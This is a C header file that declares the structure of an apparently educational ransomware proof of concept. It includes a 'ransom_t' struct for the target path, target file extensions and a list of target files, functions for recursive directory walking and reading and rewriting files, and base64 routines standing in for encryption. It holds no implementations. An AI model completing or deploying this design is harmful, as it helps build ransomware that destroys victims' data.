#ifndef FOUR_NIGHTS
#define FOUR_NIGHTS

/**
  * For real encryption, not base64
  * #include "openssl/include/openssl/blowfish.h"
 **/
#include "openssl/include/openssl/pem.h"

#include <dirent.h>
#include <limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#define BUFSIZE 1024

/**
  * struct ransom_s - struct to store often used values
  * @root_path: string that represents the target filepath
  * @file_ext_nontoken: string that contains all target file extensions
  * @file_extensions: double pointer to a list of file extensions as strings
  * @num_of_file_ext: number of file extensions
  * @os_info: pointer to a struct that contains info about the operating system
  * @target_files: file paths in a linked list
 **/
typedef struct ransom_s
{
	char *root_path;
	char *file_ext_nontoken;
	char **file_extensions;
	unsigned int num_of_file_ext;
	struct utsname os_info;
	struct node_s *target_files;
} ransom_t;
void free_ransom_struct(ransom_t *ransom);

/* Linked list functions, etc*/
/**
  * struct node_s - for singly linked lists
  * @str: string that represents the target filepath
  * @next: pointer to the next node
 **/
typedef struct node_s
{
	char *str;
	unsigned int len;
	struct node_s *next;
} node_t;
void print_list(node_t *head);
void free_list(node_t **head);
node_t *add_node(char *str, struct node_s **head);

/* String Functions */
char *tokenizer(char *str, ransom_t *ransom);
int my_strncmp(const char *s1, const char *s2, size_t n);
size_t my_strlen(const char *s);
char *my_strncat(char *dest, const char *src, size_t offset, size_t n);
char *my_strtok_r(char *str, char *delim, char **saveptr);

/* Search Functions */
int binary_search(int *array, size_t size, int value);
int binary_search_string(const char *str, size_t len, ransom_t *ransom);
unsigned int find_substr_end(char *string, char *substr);

/* Memory Management */
void *my_memset(void *s, char c, size_t n);
void *my_calloc(size_t nmemb, size_t size);
void *recalloc(void *ptr, size_t old_size, size_t new_size);

/* OS functions */
node_t *recurse_ls(char *filename, ransom_t *ransom);
char *read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *));
size_t write_file(node_t *node, char *buffer);

/* Base64 POC */
char *base64decode (const void *b64_decode_str, int decode_size);
char *base64encode (const void *b64_encode_str, int encode_size);

/* TODO if enough time */
/* Recreate: */
void *my_malloc(size_t size);
void my_free(void *ptr);

struct dirent *my_readdir(DIR *dirp);
DIR *my_opendir(const char *name);
ssize_t my_getline(char **lineptr, size_t *n, FILE *stream);


#endif
